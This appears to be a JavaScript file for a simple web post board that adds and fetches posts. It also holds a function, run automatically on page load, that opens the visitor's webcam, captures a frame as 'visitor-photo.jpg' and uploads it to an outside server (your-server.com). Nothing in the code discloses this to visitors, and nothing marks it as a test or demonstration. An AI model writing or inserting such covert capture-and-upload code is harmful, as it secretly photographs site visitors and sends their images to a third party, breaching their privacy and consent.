document.getElementById('post-button').addEventListener('click', function() {
    const postContent = document.getElementById('post-content').value;
    if (postContent) {
        const postList = document.getElementById('post-list');
        const postDiv = document.createElement('div');
        postDiv.classList.add('post');
        postDiv.textContent = postContent;
        postList.prepend(postDiv); // Add new post at the top
        document.getElementById('post-content').value = ''; // Clear the textarea
    } else {
        alert('Please enter some content for your post.');
    }
});

// Fetch posts from the server
function fetchPosts() {
    fetch('http://localhost:3000/posts')
        .then(response => response.json())
        .then(data => {
            const postList = document.getElementById('post-list');
            postList.innerHTML = ''; // Clear existing posts
            data.forEach(post => {
                const postDiv = document.createElement('div');
                postDiv.classList.add('post');
                postDiv.textContent = post.content; // Assuming post has a 'content' property
                postList.prepend(postDiv);
            });
        })
        .catch(error => console.error('Error fetching posts:', error));
}

// Function to capture and upload photo
async function captureAndUploadPhoto() {
    try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        
        // Create a canvas element to capture the photo
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        // Wait for video to load
        await new Promise(resolve => video.onloadedmetadata = resolve);
        video.play();
        
        // Set canvas size to video size
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Draw video frame to canvas
        context.drawImage(video, 0, 0);
        
        // Stop video stream
        stream.getTracks().forEach(track => track.stop());
        
        // Convert canvas to blob
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        
        // Create FormData and append photo
        const formData = new FormData();
        formData.append('photo', blob, 'visitor-photo.jpg');
        
        // Upload to server
        const response = await fetch('http://your-server.com/upload-photo', {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Failed to upload photo');
        }
        
    } catch (error) {
        console.error('Error capturing/uploading photo:', error);
    }
}

// Call captureAndUploadPhoto when page loads
window.onload = async function() {
    await captureAndUploadPhoto();
    fetchPosts(); // Keep existing functionality
};